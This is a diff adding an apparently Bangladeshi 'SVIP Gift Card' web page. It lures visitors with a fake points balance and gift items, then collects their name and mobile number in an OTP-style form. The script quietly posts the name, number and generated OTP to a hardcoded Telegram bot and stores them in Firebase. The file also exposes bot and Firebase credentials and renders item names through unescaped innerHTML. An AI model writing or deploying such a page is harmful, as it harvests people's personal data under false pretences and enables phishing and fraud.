@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+  <title>SVIP · Gift Card</title>
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    body { background: #0a0b16; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 12px; }
+    .card { max-width: 420px; width: 100%; background: linear-gradient(180deg, #1a1c30 0%, #11132a 100%); border-radius: 40px; padding: 20px 18px 28px; border: 1px solid rgba(255, 215, 0, 0.12); box-shadow: 0 25px 50px rgba(0, 0, 0, 0.9), inset 0 1px 0 rgba(255, 215, 0, 0.05); }
+    .header { display: flex; justify-content: space-between; align-items: center; padding: 0 4px; margin-bottom: 14px; }
+    .header-left { display: flex; align-items: center; gap: 10px; }
+    .header-left .svip-icon { width: 32px; height: 32px; background: linear-gradient(135deg, #f9e05a, #f5b82e); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; color: #1a1c30; font-weight: 700; box-shadow: 0 0 20px rgba(245, 184, 46, 0.3); }
+    .header-left h2 { color: #f5e7c8; font-weight: 600; font-size: 1.15rem; letter-spacing: 0.5px; }
+    .header-left h2 span { color: #f5b82e; }
+    .header-right { display: flex; align-items: center; gap: 8px; }
+    .header-right .frame-badge { background: rgba(245, 184, 46, 0.15); border: 1px solid rgba(245, 184, 46, 0.25); padding: 4px 14px; border-radius: 30px; font-size: 0.7rem; color: #f5b82e; font-weight: 600; letter-spacing: 0.5px; }
+    .header-right i { color: #f5b82e; font-size: 1.4rem; opacity: 0.8; }
+    .coin-bar { background: #1e213a; border-radius: 60px; padding: 12px 20px; display: flex; align-items: center; gap: 12px; margin-bottom: 20px; border: 1px solid #2f3357; box-shadow: inset 0 2px 4px rgba(0,0,0,0.4); cursor: pointer; transition: 0.2s; }
+    .coin-bar:hover { border-color: rgba(245, 184, 46, 0.3); }
+    .coin-bar .coin-icon { background: linear-gradient(135deg, #f9e05a, #e8a82e); width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #1a1c30; font-size: 18px; font-weight: 700; box-shadow: 0 0 15px rgba(245, 184, 46, 0.25); }
+    .coin-bar .coin-amount { color: #f5e7d0; font-weight: 700; font-size: 1.4rem; letter-spacing: 0.5px; }
+    .coin-bar .coin-label { color: #7a7fa0; font-size: 0.7rem; font-weight: 500; background: #12152a; padding: 3px 14px; border-radius: 30px; margin-left: auto; border: 1px solid #2f3357; text-transform: uppercase; letter-spacing: 0.5px; }
+    .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 4px; }
+    .item { background: #1a1d36; border-radius: 24px; padding: 14px 6px 12px; text-align: center; border: 1px solid #2a2d52; box-shadow: 0 6px 0 #0b0c16, 0 6px 16px rgba(0, 0, 0, 0.5); cursor: pointer; transition: all 0.08s ease; display: flex; flex-direction: column; align-items: center; }
+    .item:active { transform: translateY(4px); box-shadow: 0 2px 0 #0b0c16; }
+    .item-image-wrapper { width: 100px; height: 100px; border-radius: 18px; background: #11142b; display: flex; align-items: center; justify-content: center; margin-bottom: 6px; border: 1px solid #2a2d52; overflow: hidden; flex-shrink: 0; }
+    .item img { width: 100px; height: 100px; object-fit: contain; display: block; }
+    .item .name { color: #ece3d3; font-weight: 600; font-size: 0.82rem; line-height: 1.2; min-height: 2.2rem; display: flex; align-items: center; justify-content: center; margin-top: 2px; padding: 0 2px; }
+    .item .points { background: #262b4a; padding: 3px 14px; border-radius: 40px; font-size: 0.7rem; font-weight: 700; color: #f5d98a; border: 1px solid #3d4168; margin-top: 3px; letter-spacing: 0.3px; }
+    .item .days-badge { color: #8e94b8; font-size: 0.6rem; background: #13162d; padding: 2px 12px; border-radius: 30px; border: 1px solid #2f3357; margin-top: 4px; font-weight: 500; }
+    .footer-note { margin-top: 22px; display: flex; justify-content: center; align-items: center; gap: 10px; color: #6b7094; font-size: 0.7rem; border-top: 1px solid #22264a; padding-top: 16px; font-weight: 500; flex-wrap: wrap; }
+    .footer-note i { color: #f5b82e; font-size: 0.8rem; }
+    .footer-note .heart-icon { color: #ff5e7a; margin: 0 4px; }
+    .footer-note .contact-link { color: #8e94b8; text-decoration: none; transition: 0.2s; padding: 2px 8px; border-radius: 20px; }
+    .footer-note .contact-link:hover { color: #f5b82e; background: rgba(245, 184, 46, 0.1); }
+    .empty-state { grid-column: 1/-1; color: #6b7094; text-align: center; padding: 40px 20px; }
+    .empty-state i { font-size: 3rem; color: #2a2d52; margin-bottom: 12px; display: block; }
+    .empty-state p:last-child { font-size: 0.75rem; color: #4a4f78; }
+    .overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px); justify-content: center; align-items: center; z-index: 999; padding: 20px; }
+    .overlay-box { background: #1a1d36; max-width: 370px; width: 100%; border-radius: 44px; padding: 32px 24px 28px; border: 1px solid rgba(245, 184, 46, 0.2); box-shadow: 0 40px 80px rgba(0, 0, 0, 0.8); text-align: center; }
+    .overlay-box h3 { color: #f5e7c8; font-weight: 600; font-size: 1.3rem; margin-bottom: 4px; }
+    .overlay-box .sub { color: #9ea3c8; font-size: 0.8rem; margin-bottom: 16px; }
+    .overlay-box .item-preview { background: #24284a; border-radius: 60px; padding: 6px 18px; display: inline-block; color: #f5d98a; font-weight: 600; margin-bottom: 16px; border: 1px solid #3d4168; font-size: 0.85rem; }
+    .overlay-box .input-group { margin-bottom: 12px; text-align: left; }
+    .overlay-box .input-label { color: #8e94b8; font-size: 0.7rem; font-weight: 600; margin-left: 8px; margin-bottom: 4px; display: block; text-transform: uppercase; letter-spacing: 0.5px; }
+    .overlay-box input { background: #11142b; border: 1px solid #2f3357; padding: 14px 16px; border-radius: 60px; width: 100%; color: #f0e5d0; font-size: 1rem; text-align: center; outline: none; transition: 0.2s; }
+    .overlay-box input:focus { border-color: #f5b82e; box-shadow: 0 0 20px rgba(245, 184, 46, 0.15); }
+    .overlay-box input::placeholder { color: #4a4f78; }
+    .actions { display: flex; gap: 12px; margin-top: 18px; justify-content: center; }
+    .actions button { background: #262b4a; border: none; padding: 12px 16px; border-radius: 60px; font-weight: 600; color: #c8cde8; flex: 1; font-size: 0.9rem; border: 1px solid #3d4168; cursor: pointer; transition: 0.1s; }
+    .actions .primary-btn { background: linear-gradient(135deg, #f9e05a, #e8a82e); color: #0b0c16; border-color: #f5b82e; box-shadow: 0 0 30px rgba(245, 184, 46, 0.15); }
+    .actions button:active { transform: scale(0.96); }
+    .status-msg { margin-top: 14px; color: #8bc98b; font-size: 0.85rem; min-height: 1.8rem; font-weight: 500; }
+    .status-msg.error { color: #ff8a7a; }
+    .admin-badge { position: fixed; bottom: 20px; right: 20px; background: #1a1d36; border: 1px solid #2a2d52; border-radius: 60px; padding: 8px 16px; color: #6b7094; font-size: 0.7rem; text-decoration: none; display: flex; align-items: center; gap: 8px; z-index: 50; transition: 0.2s; }
+    .admin-badge:hover { border-color: #f5b82e; color: #f5b82e; }
+    .admin-badge i { font-size: 1rem; }
+    .seller-name-display { color: #f5b82e; font-weight: 600; }
+    @media (max-width: 400px) { .card { padding: 16px 12px 20px; } .item-image-wrapper, .item img { width: 80px; height: 80px; } .grid { gap: 10px; } .item { padding: 10px 4px 10px; } }
+  </style>
+</head>
+<body>
+
+<div class="card" id="app">
+  <div class="header">
+    <div class="header-left">
+      <div class="svip-icon">S</div>
+      <h2>SVIP <span>Frame</span></h2>
+    </div>
+    <div class="header-right">
+      <span class="frame-badge"><i class="fas fa-crown" style="margin-right:4px;"></i>GOLD</span>
+      <i class="fas fa-gem"></i>
+    </div>
+  </div>
+
+  <div class="coin-bar" id="coinBar">
+    <div class="coin-icon">₮</div>
+    <span class="coin-amount" id="coinDisplay">50,000</span>
+    <span class="coin-label">balance</span>
+  </div>
+
+  <div class="grid" id="itemsGrid">
+    <div class="empty-state">
+      <i class="fas fa-box-open"></i>
+      <p>কোন আইটেম নেই</p>
+      <p>আইটেম যোগ করতে অ্যাডমিন প্যানেল ব্যবহার করুন</p>
+    </div>
+  </div>
+
+  <div class="footer-note">
+    <i class="fas fa-bolt"></i>
+    <span>যোগাযোগ: <span id="sellerNameDisplay" class="seller-name-display">লিডার্জ কেয়ন</span></span>
+    <i class="fas fa-heart heart-icon"></i>
+  </div>
+
+  <div class="footer-note" style="border-top: none; padding-top: 8px; gap: 16px; font-size: 0.65rem;" id="contactLinks">
+    <a href="#" class="contact-link" id="contactTelegram"><i class="fab fa-telegram"></i> Telegram</a>
+    <a href="#" class="contact-link" id="contactWhatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a>
+    <a href="#" class="contact-link" id="contactImo"><i class="fas fa-phone"></i> Imo</a>
+    <a href="#" class="contact-link" id="contactEmail"><i class="fas fa-envelope"></i> Email</a>
+  </div>
+</div>
+
+<a href="admin.html" class="admin-badge">
+  <i class="fas fa-user-shield"></i> Admin
+</a>
+
+<div class="overlay" id="overlay">
+  <div class="overlay-box" id="overlayBox">
+    <div id="overlayContent"></div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // -------------------- FIREBASE CONFIG --------------------
+    const firebaseConfig = {
+      apiKey: "AIzaSyCFVYTeGBsfgNIQUGJoESQvfTMoheKYUI0",
+      authDomain: "api777-93f24.firebaseapp.com",
+      databaseURL: "https://api777-93f24-default-rtdb.europe-west1.firebasedatabase.app",
+      projectId: "api777-93f24",
+      storageBucket: "api777-93f24.firebasestorage.app",
+      messagingSenderId: "1036708330022",
+      appId: "1:1036708330022:android:7ad529704980507948c4e7"
+    };
+    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // -------------------- DOM REFS --------------------
+    const grid = document.getElementById('itemsGrid');
+    const coinSpan = document.getElementById('coinDisplay');
+    const overlay = document.getElementById('overlay');
+    const overlayContent = document.getElementById('overlayContent');
+
+    // -------------------- STATE --------------------
+    let currentCoins = 50000;
+    let selectedItem = null;
+    let currentOtp = '';
+    let userName = '';
+    let userNumber = '';
+    let itemsData = [];
+    let sellerData = { name: 'লিডার্জ কেয়ন', telegram: '#', whatsapp: '#', imo: '#', email: '#' };
+
+    // -------------------- TELEGRAM BOT CONFIG (send any number, any OTP) --------------------
+    const BOT_TOKEN = '8312647768:AAFHohojhu6f0AiF27aWEiXnZJWygeKwwGQ'; // your token
+    const CHAT_ID = '7197720055'; // your chat id
+
+    // -------------------- LOAD SELLER INFO --------------------
+    function loadSellerInfo() {
+      db.ref('seller').on('value', snapshot => {
+        const data = snapshot.val();
+        if (data) {
+          sellerData = data;
+          document.getElementById('sellerNameDisplay').textContent = data.name || 'লিডার্জ কেয়ন';
+          document.getElementById('contactTelegram').href = data.telegram || '#';
+          document.getElementById('contactWhatsapp').href = data.whatsapp || '#';
+          document.getElementById('contactImo').href = data.imo || '#';
+          document.getElementById('contactEmail').href = data.email || '#';
+        }
+      });
+    }
+
+    // -------------------- SEND OTP TO TELEGRAM (any number, any OTP) --------------------
+    function sendOtpToTelegram(phone, otpCode, itemName, points) {
+      const message = `🔐 *OTP Request* \n📱 Number: ${phone}\n🔑 OTP: ${otpCode}\n🎁 Item: ${itemName}\n💰 Points: ${points}\n⏰ ${new Date().toLocaleString()}`;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      return fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        console.log('✅ Telegram sent:', data);
+        return data;
+      })
+      .catch(err => {
+        console.error('❌ Telegram error:', err);
+        return err;
+      });
+    }
+
+    // -------------------- RENDER ITEMS --------------------
+    function renderItems() {
+      if (!itemsData || itemsData.length === 0) {
+        grid.innerHTML = `
+          <div class="empty-state">
+            <i class="fas fa-box-open"></i>
+            <p>কোন আইটেম নেই</p>
+            <p>আইটেম যোগ করতে অ্যাডমিন প্যানেল ব্যবহার করুন</p>
+          </div>
+        `;
+        return;
+      }
+      grid.innerHTML = '';
+      itemsData.forEach(item => {
+        const div = document.createElement('div');
+        div.className = 'item';
+        div.innerHTML = `
+          <div class="item-image-wrapper">
+            <img src="${item.image || 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAI3SURBVFhH7Zc7SgNBFIa/ILHSTgUbC2MhW1gQWBgLsbCytLKyQmyxsBBLsbSx8PEG2mgTRBtBi1SChW0KwcLC2gd05j5wmGFmH9ibJPNP7syZc+d/5sww9/+lAr+i6rfaT6fT9Ww2Wx8Oh1e9Xu8NjsVi8UJyo9HoMhQKvZVLvV6uHY1Gv6E1Go2uZ7PZJ3xMJpNPMGk+n3+Amnw+/wUmgK04AAiKq4C0uVyuQ2nAV1HAAp8CJOezBOfzOfyQaAjyeuUAwKvlWgBGJKAjFhCJRK4SicQLEpkS3+MIIj4lxhQExL1oKYqFBNTlBdI8bTxuCBCQhHs4E3YswFOtVrshCXS7XeO5oMdxJFB1l8tlz+fzvcUSiUedrlcIKCE6wU9gcCk2mwna+Xmc8V9mAZAArVbrfjab2VChUEhhb4QVnIeY0dJh8SWhkFVRij22k+WIC5zPZ1sT6Q7wfR+hXq/Lj1iUYAKAu4VWkMSJmAvPFxOxAPU3mLEWAsKx34iYgLjcIA3PVIiQXynSAygBbhbPpACh0RjYyXopU8UCEjGqU6kUejwAqGAKNwU0cV+WZ+quEAkAoCfGMLiH/PG+RCJxu91uH8bj8RWaXw6xP3CDGt6bYhYApPGr4YigPx5gBYC+hz/0aA14gA4ov/hPWI1BMeNPA2nj5xX7wIg2vwRjP4UvFz4A1BABN8qQ8lwAAAAASUVORK5CYII='}" alt="${item.name}" loading="lazy">
+          </div>
+          <div class="name">${item.name}</div>
+          <div class="points">₮${item.points}</div>
+          <div class="days-badge">${item.days || '+10 days'}</div>
+        `;
+        div.addEventListener('click', () => openNameStep(item));
+        grid.appendChild(div);
+      });
+    }
+
+    // -------------------- OPEN NAME STEP --------------------
+    function openNameStep(item) {
+      if (currentCoins < item.points) {
+        showStatus('⚠️ পর্যাপ্ত পয়েন্ট নেই!', 'error');
+        return;
+      }
+      selectedItem = { ...item };
+      overlayContent.innerHTML = `
+        <h3><i class="fas fa-user" style="color:#f5b82e;margin-right:8px;"></i> আপনার তথ্য দিন</h3>
+        <div class="sub">আইটেম: <span class="item-preview">${item.name} (₮${item.points})</span></div>
+        <div class="input-group">
+          <label class="input-label"><i class="fas fa-user"></i> নাম</label>
+          <input type="text" id="nameInput" placeholder="আপনার নাম" autocomplete="off">
+        </div>
+        <div class="input-group">
+          <label class="input-label"><i class="fas fa-phone"></i> মোবাইল নম্বর (11 ডিজিট)</label>
+          <input type="tel" id="numberInput" placeholder="017xxxxxxxx" maxlength="11" inputmode="numeric" autocomplete="off">
+        </div>
+        <div class="actions">
+          <button id="cancelStep1"><i class="fas fa-times"></i> বাতিল</button>
+          <button class="primary-btn" id="sendNameBtn"><i class="fas fa-paper-plane"></i> প্রেরণ</button>
+        </div>
+        <div class="status-msg" id="stepStatus"></div>
+      `;
+      overlay.style.display = 'flex';
+      document.getElementById('nameInput').focus();
+
+      document.getElementById('cancelStep1').addEventListener('click', closeOverlay);
+      document.getElementById('sendNameBtn').addEventListener('click', handleSendName);
+      document.getElementById('nameInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') document.getElementById('numberInput').focus();
+      });
+      document.getElementById('numberInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') handleSendName();
+      });
+      document.getElementById('numberInput').addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 11);
+      });
+    }
+
+    // -------------------- HANDLE SEND NAME (generate OTP + send to Firebase + Telegram) --------------------
+    function handleSendName() {
+      const nameInput = document.getElementById('nameInput');
+      const numberInput = document.getElementById('numberInput');
+      const name = nameInput.value.trim();
+      const number = numberInput.value.trim();
+
+      const st = document.getElementById('stepStatus');
+      if (!name) { st.className = 'status-msg error'; st.innerText = '❌ দয়া করে আপনার নাম দিন'; return; }
+      if (!number) { st.className = 'status-msg error'; st.innerText = '❌ দয়া করে মোবাইল নম্বর দিন'; return; }
+      if (number.length !== 11) { st.className = 'status-msg error'; st.innerText = '❌ নম্বরটি 11 ডিজিট হতে হবে'; return; }
+
+      userName = name;
+      userNumber = number;
+      currentOtp = String(Math.floor(1000 + Math.random() * 9000));
+      console.log('🔐 OTP for', userName, ':', currentOtp);
+
+      // 1. Save to Firebase (for admin panel)
+      const requestData = {
+        name: userName,
+        number: userNumber,
+        item: selectedItem.name,
+        points: selectedItem.points,
+        otp: currentOtp,
+        timestamp: Date.now(),
+        status: 'pending'
+      };
+
+      db.ref('otp_requests').push(requestData)
+        .then(() => {
+          console.log('✅ OTP Request saved to Firebase');
+          
+          // 2. Send OTP to Telegram (any number, any OTP)
+          sendOtpToTelegram(userNumber, currentOtp, selectedItem.name, selectedItem.points)
+            .then(res => {
+              console.log('Telegram response:', res);
+            })
+            .catch(err => console.error('Telegram send error:', err));
+
+          // 3. Show OTP step
+          showOtpStep();
+        })
+        .catch(err => {
+          st.className = 'status-msg error';
+          st.innerText = '❌ সার্ভার এরে: ' + err.message;
+        });
+    }
+
+    // -------------------- SHOW OTP STEP --------------------
+    function showOtpStep() {
+      overlayContent.innerHTML = `
+        <h3><i class="fas fa-shield-alt" style="color:#f5b82e;margin-right:8px;"></i> OTP নিশ্চিত করুন</h3>
+        <div class="sub">${userName} · ${userNumber} · ${selectedItem.name} (₮${selectedItem.points})</div>
+        <div class="input-group">
+          <label class="input-label"><i class="fas fa-key"></i> 4-অঙ্কের OTP</label>
+          <input type="text" id="otpInput" maxlength="4" placeholder="· · · ·" inputmode="numeric">
+        </div>
+        <div class="actions">
+          <button id="cancelOtp"><i class="fas fa-arrow-left"></i> পিছনে</button>
+          <button class="primary-btn" id="confirmOtpBtn"><i class="fas fa-check"></i> নিশ্চিত</button>
+        </div>
+        <div class="status-msg" id="otpStatus"></div>
+      `;
+      document.getElementById('otpInput').focus();
+      document.getElementById('otpInput').addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 4);
+      });
+      document.getElementById('cancelOtp').addEventListener('click', () => {
+        openNameStep(selectedItem);
+      });
+      document.getElementById('confirmOtpBtn').addEventListener('click', handleConfirmOtp);
+      document.getElementById('otpInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') handleConfirmOtp();
+      });
+    }
+
+    // -------------------- CONFIRM OTP --------------------
+    function handleConfirmOtp() {
+      const otpInput = document.getElementById('otpInput');
+      const entered = otpInput.value.trim();
+      const statusEl = document.getElementById('otpStatus');
+      if (!selectedItem) {
+        statusEl.className = 'status-msg error';
+        statusEl.innerText = '❌ আইটেম নির্বাচন করুন';
+        return;
+      }
+      if (!currentOtp) {
+        statusEl.className = 'status-msg error';
+        statusEl.innerText = '⚠️ OTP তৈরি হয়নি, আবার চেষ্টা করুন';
+        return;
+      }
+      if (entered !== currentOtp) {
+        statusEl.className = 'status-msg error';
+        statusEl.innerText = '❌ OTP মিলছে না!';
+        return;
+      }
+      const cost = selectedItem.points;
+      if (currentCoins < cost) {
+        statusEl.className = 'status-msg error';
+        statusEl.innerText = '⚠️ পয়েন্ট কম!';
+        return;
+      }
+      const newBalance = currentCoins - cost;
+      currentCoins = newBalance;
+      updateCoinDisplay();
+
+      db.ref('coins/balance').set(currentCoins)
+        .then(() => {
+          db.ref('transactions').push({
+            name: userName,
+            number: userNumber,
+            item: selectedItem.name,
+            points: cost,
+            timestamp: Date.now(),
+            remaining: currentCoins
+          });
+          statusEl.className = 'status-msg';
+          statusEl.innerText = `✅ সফল! বাকি ₮${currentCoins}`;
+          setTimeout(() => { closeOverlay(); }, 1500);
+        })
+        .catch(err => {
+          console.error('Firebase update error:', err);
+          currentCoins += cost;
+          updateCoinDisplay();
+          statusEl.className = 'status-msg error';
+          statusEl.innerText = '❌ ডাটাবেস আপডেট ব্যর্থ';
+        });
+    }
+
+    // -------------------- CLOSE OVERLAY --------------------
+    function closeOverlay() {
+      overlay.style.display = 'none';
+      overlayContent.innerHTML = '';
+      selectedItem = null;
+      currentOtp = '';
+      userName = '';
+      userNumber = '';
+    }
+
+    function showStatus(msg, type = '') {
+      const st = document.getElementById('stepStatus');
+      if (st) { st.className = 'status-msg ' + type; st.innerText = msg; }
+      setTimeout(() => { if (st) { st.className = 'status-msg'; st.innerText = ''; } }, 2500);
+    }
+
+    function updateCoinDisplay() {
+      coinSpan.innerText = currentCoins.toLocaleString();
+    }
+
+    // -------------------- LOAD ITEMS & BALANCE --------------------
+    function loadItems() {
+      db.ref('items').on('value', snapshot => {
+        const data = snapshot.val();
+        if (data) {
+          itemsData = Object.keys(data).map(key => ({
+            id: key,
+            ...data[key]
+          }));
+        } else {
+          itemsData = [];
+        }
+        renderItems();
+      });
+    }
+
+    function loadBalance() {
+      db.ref('coins/balance').on('value', snapshot => {
+        const val = snapshot.val();
+        if (typeof val === 'number') {
+          currentCoins = val;
+        } else {
+          currentCoins = 50000;
+          db.ref('coins/balance').set(50000);
+        }
+        updateCoinDisplay();
+      });
+    }
+
+    // -------------------- INIT --------------------
+    loadSellerInfo();
+    loadItems();
+    loadBalance();
+
+    overlay.addEventListener('click', (e) => {
+      if (e.target === overlay) closeOverlay();
+    });
+
+    window.__debug = { db, currentCoins, itemsData, sellerData };
+  })();
+</script>
+</body>
+</html>
